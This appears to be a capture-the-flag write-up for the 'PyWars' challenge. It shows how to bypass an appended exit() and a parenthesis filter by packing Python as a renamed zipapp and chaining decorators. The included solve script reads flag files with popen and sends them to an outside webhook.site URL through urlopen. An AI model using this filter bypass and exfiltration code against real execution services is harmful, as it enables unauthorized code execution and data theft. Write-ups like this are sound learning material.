# ♖ PyWars ♖
> Author: 堇姬Naup

## analyze
Go to read source code.
You can upload one python file, it will add `exit()\n` on your upload's file and use `python3 <your upload python file>`.
So if you can bypass code which it add. You will execute any python's code.

Let me look how to bypass.
Read python's document, we will read this
https://docs.python.org/3.14/library/zipapp.html

You can pack your `.py` to `.pyz`
If we add some bytes in front of `zip's magic number`, it still can be execute.
And then pyz can use `python3 script.pyz`.

```
00000000: 504b 0304 1400 0000 0000 9753 7f5a dc1b  PK.........S.Z..
00000010: 5faa 2e02 0000 2e02 0000 0b00 0000 5f5f  _.............__
```
So we write code at `script/__main__.py`, and pack it to pyz.

OK, let me review code.
It have filter, and just upload `.py`
But we can use `script.pyz.py`, it can bypass its filter. And if your upload's file format is `.pyz`, it will be executed no matter how its file extension

And it filter `(` and `)`, we can use python's decorator to bypass it.
For example:
```c
cmd2 = lambda a: "cat /app/flags/flag*"

@popen
@cmd2
class flag:pass
```

This code is `popen("cat /app/flags/flag*")`
No curl or wget, so we use `urllib.request`, and send flag on your server.


## script
run.sh
```sh
python3 -m zipapp script
mv script.pyz script.pyz.py
```

script/\_\_main\_\_.py
```py
from os import popen
from urllib.request import urlopen

token = "TomorinIsCuteAndILovePython" 
url = "https://webhook.site/111d99e4-8095-4b6a-bf04-e4a79209bce2/?flag="

cmd2 = lambda a: "cat /app/flags/flag*"
func2 = lambda f: [x[:-1] for x in f][0]

@func2
@popen
@cmd2
class flag:pass

flagurl = url + flag
urls = lambda f: flagurl

@urlopen
@urls
class requestf:pass
```
